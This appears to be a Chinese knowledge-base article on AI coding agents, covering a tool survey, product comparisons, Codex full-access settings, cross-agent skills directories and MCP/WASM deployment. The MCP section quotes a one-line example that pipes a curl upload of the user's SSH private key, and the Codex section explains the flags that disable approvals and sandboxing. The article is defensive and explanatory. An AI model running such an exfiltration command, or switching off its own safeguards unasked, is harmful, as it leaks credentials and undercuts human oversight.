# AI 编程

编程智能体（AI Agent）读取项目、修改文件、调用工具、验证结果，形成工作闭环。本领域主线：工具与入口选型、模型接入、工具封装与云端部署、权限与技能共享。清单与对比以官方文档核实为界，不构成当前排名。

## 编程智能体工具全景

代表性清单包含 12 个海外工程开发工具或系列、9 个国内厂商工具或系列、5 个国际开源工具和 4 个海外应用构建平台。同一产品可以同时提供终端、IDE、桌面与云端入口，不能按入口重复计数。

```text
读项目 --> 改文件 --> 调工具 --> 验证结果
  ^                                  |
  +----------------------------------+
```

收录口径：

- 集成开发环境（Integrated Development Environment，IDE）与命令行界面（Command-Line Interface，CLI）是入口形态；文中把 CLI 写作「终端」。
- 国内外按产品团队背景划分；Qoder 的国际产品仍放在国内厂商组。
- 「特点」概括官方能力描述，不代表已实测的质量优势。
- 开源工具仍可能产生模型调用、托管或企业功能费用，不等于整套服务免费。

四组清单（名称与入口以各官方文档为准）：

- **海外工程开发（12 个）**：Claude Code、Codex、Cursor、GitHub Copilot、Devin/Devin Desktop、Gemini CLI、Antigravity、Kiro、Junie、Augment Code/Auggie、Amp、Droid。
- **国内厂商（9 个）**：TRAE/TraeCode（字节跳动）、Qoder/Qoder CN（阿里云，含原通义灵码）、Qwen Code（阿里 Qwen 团队）、CodeBuddy（腾讯云）、文心快码 Comate（百度）、CodeArts 代码智能体（华为云）、Kimi Code（月之暗面）、ZCode（智谱）、CoStrict（深信服/CoStrict 团队）。
- **国际开源（5 个）**：Cline、Kilo Code、OpenCode、Aider、OpenHands。Qwen Code、Gemini CLI、CoStrict 已列在厂商组，不重复计数。
- **海外应用构建平台（4 个）**：Replit Agent、Lovable、Bolt.new、v0。

旧名称与服务状态：

- **Windsurf**：2026-06-02 官方发布 Devin Desktop，称为 Windsurf 的下一代；与 Devin 合并为一个产品系列计数。[一手：发布说明](https://cognition.com/blog/introducing-devin-desktop)
- **通义灵码**：阿里云现行入口为 Qoder CN 系列，正文保留「原通义灵码」的产品关系，不另算新产品。[一手：现行文档](https://help.aliyun.com/zh/lingma)
- **Roo Code**：官方仓库 2026-05-15 归档；原官网跳转至 Roomote。Roomote 标明 source-available，不能据此称其为开源。[一手：仓库](https://github.com/RooCodeInc/Roo-Code)
- **iFlow CLI**：官方 2026-04-17 关闭托管模型调用、搜索等服务；现存客户端仍支持 OpenAI 兼容自定义模型。[一手：公告](https://vibex.iflow.cn/t/topic/5753)

边界：以上核实产品入口、公开能力、名称与公开服务状态；未安装实测，不做模型质量、成功率、价格或地区可用性排名。部分动态站点抓取失败，改用已读取的第一方文档或官方工程文章作依据。

信源（一手）：[Claude Code 概览](https://code.claude.com/docs/en/overview)、[Codex CLI](https://learn.chatgpt.com/docs/codex/cli)、[TraeCode 概览](https://docs.trae.cn/ide_what-is-trae-code)、[Qoder CN 现行文档](https://help.aliyun.com/zh/lingma)、[Devin Desktop 发布说明](https://cognition.com/blog/introducing-devin-desktop)。

## 常驻智能体队友：Grok Bot

Grok Bot 是 SpaceXAI（原 xAI，2026-02-02 并入 SpaceX）于 2026-08-11 发布的常驻智能体产品。用户创建多名有名字、有职责的「AI 队友」；它们 7×24 在线，共享一台按用户隔离的持久云端计算机，能登录用户的工具并以图形界面方式操作，带回完成的工作。它与 Grok 聊天机器人（2023-11-03 发布）和终端编程智能体 Grok Build 是三个产品。

关键事实（2026-09-23 核实）：

- **形态**：桌面客户端（macOS、Windows）与 iOS；以对话方式给 Bot 派活，可多 Bot 并行；本地笔记本关机后云端继续执行。
- **隔离粒度**：同一用户的所有 Bot 共享一台持久云端计算机；文件、浏览器、登录态按用户隔离，不按 Bot 隔离。
- **教学**：Bot 可观看用户演示一遍工作流并存为例行任务，此后自主执行。
- **协作与记忆**：多个 Bot 可进入同一线程互相传递工作；Bot 保留上下文并可互相学习。
- **安全**：敏感操作需经 Auto Review；传输与静态加密；可退出训练；企业版支持 DLP、证书与代理。
- **订阅**：Cursor Pro/Pro+/Ultra、SuperGrok/SuperGrok Plus/Heavy 及 Teams、Enterprise 计划包含；额外用量按 token 成本计费。
- **设计原则**（官方设计文章）：聊天历史变成 Bot 名册；Bot 有在线状态、有自己的计算机；工作可不经提示开始。
- 常被与开源个人智能体 OpenClaw 对比（[二手] Lenny's Newsletter，2026-09-02）。

信源：[一手] [Grok Bot 产品页](https://x.ai/bot)、[SpaceXAI 新闻列表](https://x.ai/news)、[Grok API 文档](https://docs.x.ai)；[二手] The Verge 2026-08-12 报道（发布事件旁证）。

## OpenCode 可用的模型

OpenCode 支持多家在线模型提供商和本地模型；具体可用模型取决于已连接的提供商、凭据与配置。官方 Zen 列有 GPT、Claude、Gemini、Grok、Qwen、DeepSeek、MiniMax、GLM、Kimi 等系列。

查看当前配置下的准确列表：终端输入 `/models`，或运行 `opencode models`。

信源（一手）：[模型文档](https://opencode.ai/docs/models/)、[Zen 模型列表](https://opencode.ai/docs/zen/)、[提供商文档](https://opencode.ai/docs/providers/)、[CLI 文档](https://opencode.ai/docs/cli/)。

## ZCode 与 Claude Code 的差距

应分开比较工具与模型两层。

产品形态：差距已基本对齐。

| 维度 | ZCode | Claude Code |
| --- | --- | --- |
| 终端 | `zcode` CLI/TUI | `claude` CLI |
| 桌面 | Electron 桌面应用 | 桌面应用（mac/win，Linux beta） |
| 浏览器 | `zcode --web` 本地 Web UI | claude.ai/code 云端，无需本地环境 |
| 扩展 | 技能（Skill）、UI 插件、模型上下文协议（Model Context Protocol，MCP）、子代理（MCP 与子代理为本会话 CLI 实测） | CLAUDE.md、技能、hooks、MCP、子代理 |

修正记录：旧判断认为 Claude Code 多出云端托管运行、移动端 App、Slack/Channels 集成、Agent SDK、后台并行 agent、云端定时任务与 GitHub Actions/GitLab CI 集成。2026-10-29 修正：ZCode 已提供手机浏览器远控、微信/飞书 Bot Channel 和本地定时任务；手机远控不等于独立移动 App，本地定时不等于云端托管；未对 ZCode 全面排查的能力不能据此断言缺失。

成熟度与生态：

- Claude Code：2025-02-24 以 limited research preview 首发，此后约 20 个月周更级迭代（2.1.x 系列）。
- ZCode：仓库公开版本记录自 2026-09-23（v3.14.3）起，2026-10-19 至 v3.16.2；8.3k stars。开源发生于 2026 年 9 月（媒体一致报道；「开源当日仓库仅两次提交」出自 The Next Web，二手，未核实）。
- 智谱同时在 Claude Code 内运营官方插件市场（zai-coding-plugins），GLM 也可服务 Claude Code 用户。

模型层：无法量化。

- Claude Code 终端与 IDE 入口支持第三方提供商；智谱提供 GLM Coding Plan 的兼容接口接入教程。因此 GLM 的价格、国内服务与模型能力不能算作 ZCode 的独有优势；也不能把「有兼容接入方式」外推为任意模型与全部功能无条件兼容。
- ZCode 工具免费；自配智谱服务（GLM Coding Plan 等）、OpenAI 兼容端点或 Anthropic 端点。
- 已核实的同条件对比仅有小模型层：GLM-5.3-Flash 对 Claude Haiku 5.5，Haiku 5.5 多数项领先，GDPval-AA v2.1 上 GLM 略高。不能外推到双方旗舰模型。

为什么还用 ZCode：闲时任务。符合资格的 Coding Plan 订阅用户把不紧急的本地任务排队执行，自动执行不消耗套餐额度。适用条件与限制（均据官方文档，2026-10-29 核实）：

- 需要有效的 ZAI 或 BigModel 个人 Coding Plan；Start Plan 和纯 API Key 模式不支持；团队套餐支持分批开放中。
- 只支持桌面端本地项目；电脑必须保持唤醒。
- 每天创建数量有上限；队列不承诺开始时间。
- 自动执行与分段续跑不扣套餐额度；用户主动发送的追加消息及其驱动的执行正常计入额度；权限确认属于免费自动执行。
- 闲时通道实际使用的模型由服务端统一指定，不保证使用会话界面显示的自选模型；支持前台子代理，不支持后台子代理。

结论：形态差距已对齐；模型层差距没有已核实数据；日常任务两者均可用，选型取决于模型偏好、预算与网络条件。如果已用顺 Claude Code + GLM，又不需要闲时任务或其他经实际验证的 ZCode 工作流，现有证据不足以支持迁移。官方「深度联调」是厂商表述，不能替代同模型、同仓库、同任务的实测。

信源（一手）：[zai-org/ZCode 仓库](https://github.com/zai-org/ZCode)、[ZCode 官方问答](https://zcode.z.ai/cn/docs/qa)、[Claude Code 概览](https://code.claude.com/docs/en/overview)、[Anthropic 2025-02-24 公告](https://www.anthropic.com/news/claude-3-7-sonnet)、[智谱：Claude Code 接入 GLM Coding Plan](https://docs.bigmodel.cn/cn/coding-plan/tool/claude)、[ZCode 闲时任务](https://zcode.z.ai/cn/docs/idle-time-tasks)、[ZCode 自动化](https://zcode.z.ai/cn/docs/automations)、[Remote Control](https://zcode.z.ai/cn/docs/remote-control)、[Bot Channel](https://zcode.z.ai/cn/docs/bot-channel)。

## ZCode 桌面版的打包与分发

桌面版基于 Electron 41，用 electron-builder 打包 mac/win/linux 安装包。这是「JS 与 Chromium+Node.js 运行时一起分发」，不是编译为原生代码。

仓库内真正的编译环节：

```text
主进程 TypeScript --tsup--> JS
渲染层 React -------Vite--> JS
两者的 JS + Chromium + Node.js 运行时
        |
        +-- electron-builder --> mac/win/linux 安装包
node-pty 等原生模块 ----> 按平台重编译
桌面内置 Agent ---------> 可编译为 V8 字节码
CLI --------------------> 可选 SEA 打包
```

CLI 版另有可选的单一可执行应用（Single Executable Application，SEA）打包。

信源（一手）：[ZCode 仓库 README](https://github.com/zai-org/ZCode/blob/master/README.md)、[packages/desktop/package.json](https://github.com/zai-org/ZCode/blob/master/packages/desktop/package.json)、[apps/zcode-cli/package.json](https://github.com/zai-org/ZCode/blob/master/apps/zcode-cli/package.json)。

## Codex 的完整访问权限设置

Codex 的 Full access 对应两个配置：`approval_policy = "never"` 与 `sandbox_mode = "danger-full-access"`。

- 终端启动：`codex --yolo`（即 `--dangerously-bypass-approvals-and-sandbox`）。
- 桌面/IDE：在输入框下方权限菜单选择 Full access。
- CLI 会话内：`/permissions`。
- 默认值写入用户 `~/.codex/config.toml` 顶层。

限制：`never` 仅关闭审批；必须同时取消沙箱才是完整访问。命令行参数、项目配置及组织强制要求仍可能影响结果。产品变更快，具体配置按问题日期（2026-10-25）重新核实。

信源（一手）：[Sandbox](https://learn.chatgpt.com/docs/sandboxing)、[Developer commands](https://learn.chatgpt.com/docs/developer-commands?surface=cli)、[Config basics](https://learn.chatgpt.com/docs/config-file/config-basic)。

## Codex 桌面端与 CLI 的分工

ChatGPT desktop app 内可选择 ChatGPT 或 Codex；本文比较其中的 Codex 与 CLI。两者共享底层 Codex 代理框架：App、CLI 和 IDE 扩展使用同一框架。宿主仍提供不同的界面、上下文、工具和执行边界；共享框架不能证明行为一致，也不能证明某一入口编码质量更高。比较任务质量时应固定模型、推理强度、指令、工具、权限及执行环境。

```text
        +------------------------------+
        |  Codex 代理框架（同一底层）    |
        +------------------------------+
            |           |          |
          桌面端      IDE 扩展     CLI
```

已核实差异：

| 维度 | 桌面端中的 Codex | Codex CLI |
| --- | --- | --- |
| 项目管理 | Projects 视图组织项目和聊天；提供 Git 工作树（Git worktree）创建与聊天迁移 | 以启动目录或 `--cd` 指定目录为项目；无 Projects 视图，可恢复已保存会话 |
| 审查与成果 | 查看代码差异、评论和检查；可打开文档、表格、图片等成果 | 本地代码审查，结果主要经终端呈现 |
| 浏览器 | 内置浏览器，人与智能体共用网页视图；可预览本地网页并操作网站 | 同一内置 Browser 官方明确不在 CLI 提供；联网搜索与浏览器操作是不同能力 |
| 定时任务 | Scheduled 管理界面；本地任务需电脑开机且应用运行，可在项目目录或隔离工作树执行 | 无该界面；外部调度器可调用 `codex exec` |
| 脚本集成 | 适合聊天式持续指导和查看结果 | `codex exec` 支持标准输入输出、JSONL 事件和按 JSON Schema 约束结果，可用于持续集成（Continuous Integration，CI） |

注意：当前 CLI 已支持图片输入和联网搜索，不能概括为只能处理纯文本。桌面端还可通过 Computer Use 插件操作图形界面：官方说明支持地区内的 macOS、Windows 可在 ChatGPT Work 和 Codex 中使用，Windows 使用活动桌面前台；未核实 CLI 有等价的原生集成。

登录与计费：两者本地工作均支持 ChatGPT 登录与 API key 登录。ChatGPT 登录使用适用订阅权益；API key 按 API 用量计费，部分依赖 ChatGPT 工作区或云端服务的能力受限。「CLI 必须另买 API」与「桌面端只能用订阅」都不成立。

建议：需要在电脑前持续指导、检查网页或管理多个任务时优先桌面端；需要把任务放进脚本、远程终端或 CI 流程时优先 CLI。此建议基于官方工作流，不代表质量或速度实测结论。

信源（一手）：[Codex as a platform](https://developers.openai.com/blog/codex-as-a-platform)、[ChatGPT desktop app](https://learn.chatgpt.com/docs/app)、[Codex CLI](https://learn.chatgpt.com/docs/cli)、[Non-interactive mode](https://learn.chatgpt.com/docs/non-interactive-mode)、[Browser](https://learn.chatgpt.com/docs/browser)、[Authentication](https://learn.chatgpt.com/docs/auth)。

## 跨智能体共享技能：项目 .agents/skills

推荐布局 `.agents/skills/<技能名>/SKILL.md`：每个技能一个独立子目录，`SKILL.md` 的 YAML 元数据写清 `name` 与 `description`，名称与技能目录名一致。不要因为某工具支持分组目录，就假定所有工具都递归发现多层技能；各宿主的专用元数据和执行工具也不完全通用。

```text
项目根目录/
+-- .agents/
    +-- skills/
        +-- my-skill/
            +-- SKILL.md
            +-- scripts/     （可选）
            +-- references/  （可选）
```

已核实直接发现项目 `.agents/skills/` 的工具（2026-10-29 逐项查看官方文档；未在本机各工具中实测，清单不是所有智能体的完整名单）：

- **Codex**：扫描当前工作目录到仓库根目录各层的 `.agents/skills`。
- **ZCode 当前开源 CLI/Agent**：默认发现用户及项目 `.zcode/skills` 和 `.agents/skills`，同级 `.zcode` 优先；可用 `zcode skills list --cwd <绝对路径> --json` 核对。
- **Cursor**：官方 Skill directories 表列出项目 `.agents/skills/`。
- **OpenCode**：列出 Project agent-compatible 路径 `.agents/skills/<name>/SKILL.md`；从当前目录向 Git 工作树根查找。
- **Gemini CLI**：列出工作区 `.gemini/skills/` 与 `.agents/skills/` 别名；可用 `/skills list`、`/skills reload` 核对。
- **GitHub Copilot CLI**：列出 `.github/skills`、`.claude/skills`、`.agents/skills`；新增后可用 `/skills reload`。结论仅核实 CLI，不外推所有编辑器入口。
- **Claude Code**：官方默认项目位置为 `.claude/skills/<name>/SKILL.md`；未核实其原生直接扫描 `.agents/skills`。官方支持 `.claude/skills` 内的技能目录是指向别处的符号链接，可借此共享。

「自动读取」分三个层次：

1. **发现**：工具扫描支持的目录，检查格式与启用状态，把技能放入可用清单。
2. **选择**：模型按名称、描述与当前任务判断是否使用，或用户显式指定；不能保证每次触发。
3. **加载**：选用后才读取正文及所需资源；不等于执行技能内所有脚本。

因此自动发现不等于正文常驻，也不等于每个相关请求必然调用。`AGENTS.md` 是项目指令文件，`.agents/skills/` 是技能发现目录；某工具会读 `AGENTS.md` 不能证明它也扫描 `.agents/skills`。长期共用方案：以 `.agents/skills` 为主存放位置，为缺少该默认发现入口的宿主增加其支持的技能目录链接。

信源（一手）：[OpenAI：Build skills](https://learn.chatgpt.com/docs/build-skills)、[ZCode：Skills 使用指南](https://github.com/zai-org/ZCode/blob/main/apps/zcode-cli/docs/usage/08-skills.md)、[ZCode：桌面 Skill 管理](https://zcode.z.ai/cn/docs/skill)、[Cursor：Agent Skills](https://cursor.com/docs/skills)、[OpenCode：Agent Skills](https://docs.opencode.ai/docs/skills/)、[Gemini CLI：Managing Agent Skills](https://github.com/google-gemini/gemini-cli/blob/main/docs/cli/using-agent-skills.md)、[GitHub Copilot CLI：添加技能](https://docs.github.com/en/copilot/how-tos/copilot-cli/customize-copilot/add-skills)、[Claude Code：加载位置与链接](https://code.claude.com/docs/en/skills#choose-where-skills-load)。

## 将 WebAssembly 封装为 MCP 工具

可以，三种形态均已落地。可行性根据：MCP 规范只定义 JSON-RPC 消息与传输绑定，明确与传输无关（transport-agnostic），不约束服务器实现技术。

```text
                     MCP 客户端（智能体）
                            |
                       JSON-RPC 消息
                            |
      +---------------------+---------------------+
      |                     |                     |
 形态一：自建宿主      形态二：通用插件型     形态三：整体编译
 MCP SDK 写服务器     Wassette / hyper-mcp   Spin / Wasmcp
 handler 内调用       插件即 WASM 模块       服务器编译为
 Wasmtime / Extism                          单个 server.wasm
      |                     |                     |
      +---------------------+---------------------+
                            |
                    WASM 导出函数执行
```

- **形态一（自建宿主）**：用 MCP SDK 写服务器，在工具 handler 内经 Wasmtime 或 Extism 调用 WebAssembly（WASM）导出函数。
- **形态二（通用插件型服务器）**：微软 Wassette 用 Wasmtime 加 WIT（WebAssembly Interface Types）接口生成 MCP 工具，OCI（Open Containers Initiative）制品分发，默认拒绝授权；hyper-mcp 基于 Extism 插件，可配 allowed_hosts 与 memory_limit，带 sigstore 签名。原仓库 2026-01-11 归档并迁移。
- **形态三（服务器整体编译为 WASM）**：Spin/Wasmcp 把工具与中间件组合为单个 server.wasm，导出 wasi:cli/run（stdio）或 wasi:http/incoming-handler（Streamable HTTP）。

收益：能力式沙箱；OCI 小体积分发。限制：系统能力须宿主显式授予；移植到组件模型（Component Model）有门槛；会话与授权在各运行时实现碎片化。另：mcp.run 经 301 重定向至 turbomcp.ai，后者未再提及 WASM，原注册表现状未核实。

信源（一手）：[MCP 规范·传输（2026-07-28 版）](https://modelcontextprotocol.io/specification/2026-07-28/basic/transports)、[微软 Wassette 发布文](https://opensource.microsoft.com/blog/2025/08/06/introducing-wassette-webassembly-based-tools-for-ai-agents)、[Spin/Wasmcp 博文](https://spinframework.dev/blog/mcp-with-wasmcp)、[Wasmtime 官网](https://wasmtime.dev/)、[hyper-mcp 仓库（归档，项目已迁移）](https://github.com/tuananh/hyper-mcp)。

## MCP 服务器的接入方式：本地进程与远程 HTTP

先分清维度：npx 是包执行与启动命令；stdio 和 Streamable HTTP 才是 MCP 传输。启动命令、传输方式、部署位置与并发能力是不同维度。

修正记录（2026-10-25）：旧答案把「npx 还是 HTTP」当作二选一，并称 SSE 已弃用。修正为：弃用的是旧 HTTP+SSE 传输；当前 Streamable HTTP 仍可用请求级 SSE。

选择逻辑：

- 需要直接访问本机（文件、数据库、本地进程）的工具，通常要求服务器或桥接组件在本机运行；本机服务器可用 stdio 或回环 HTTP；选择还受具体宿主支持限制。
- 提供官方托管 URL 的云服务用 HTTP。Claude Code 官方推荐远程用 HTTP：支持 OAuth 登录与掉线自动重连；stdio 本地进程不自动重连。
- 云端与网页客户端（如 claude.ai 连接器）只能用 HTTP。

安全取舍（本地服务器权限与远程数据暴露分别评估）：

- npx 启动的第三方 npm 包以你的用户权限在本机执行，是 MCP 安全文档明确列出的任意代码执行与数据外传攻击面；官方示例即 `npx malicious-package && curl -d @~/.ssh/id_rsa …`。npx 的好处是数据不出机（除非工具自身联网）。
- HTTP 服务器代码不在本机跑；但对方可见全部请求数据。

信源（一手）：[Claude Code MCP 文档](https://code.claude.com/docs/en/mcp)、[MCP 安全最佳实践 2026-07-28 版](https://modelcontextprotocol.io/specification/2026-07-28/basic/security_best_practices)、[stdio 规范](https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/stdio)、[Streamable HTTP 规范](https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/streamable-http)。

## WASM 云端并发与 C++ 取舍：DWG 处理案例

**并发与 WASM 无关。** Wasmtime 官方语义：每个实例独占线性内存；Store 是隔离边界；不同 Store 的实例可跨线程并行；Engine（编译产物）线程间共享，模块只编译一次。按请求实例化即请求间零共享，天然隔离、可扩展。

```text
      Engine（编译产物，线程间共享；模块只编译一次）
                        |
        +---------------+---------------+
        |                               |
     Store A                         Store B     （Store 是隔离边界）
        |                               |
 实例 A（独占线性内存）          实例 B（独占线性内存）
        |                               |
     请求 1                         请求 2       （跨线程并行）
```

DWG 处理「传文件、回结果」天然无状态，MCP 协议本身也无状态。多人并发是普通后端问题：水平扩展、网关认证限流、单实例内存与时间限额。

修正记录（2026-10-25）：旧结论称单个 stdio MCP 服务器进程内的工具调用在该实例内串行排队。修正为：stdio 只规定共享通道、消息分帧和按请求 ID 关联结果，不强制工具串行；实际并发取决于 SDK、处理函数和资源限制。

C++ 替代的取舍：

- 可信用户加自有服务器：用 C++ 的直觉正确。原生更简单，无 WASM 开销（官方称接近原生，具体百分比未实测）。
- 公网接收不可信 DWG 上传：WASM 内存沙箱仍有真实价值。DWG 解析器是内存安全重灾区：已核实 LibreDWG CVE-2025-61154——decode.c 的 decompress_R2004_section 堆溢出，恶意 DWG 触发拒绝服务（Denial of Service，DoS），CVSS 6.5；另检索命中 CVE-2026-15520/9502/9602 同类（摘要命中，未逐条打开原文）。原生代码堆写溢出最坏可升级为代码执行；WASM 中溢出被限制在线性内存内，最多该请求崩溃。
- 次级价值：每请求一实例的隔离密度比容器便宜（ResourceLimiter、PoolingAllocator 为此设计）；同一 .wasm 跨本地、边缘、云端复用。

信源（一手）：[Wasmtime API 文档](https://docs.rs/wasmtime/latest/wasmtime/)、[GHSA-37rg-q294-rgvc / CVE-2025-61154 通告](https://github.com/advisories/GHSA-37rg-q294-rgvc)、[MCP 安全最佳实践](https://modelcontextprotocol.io/specification/2026-07-28/basic/security_best_practices)、[MCP 基础消息与请求 ID](https://modelcontextprotocol.io/specification/2026-07-28/basic)。
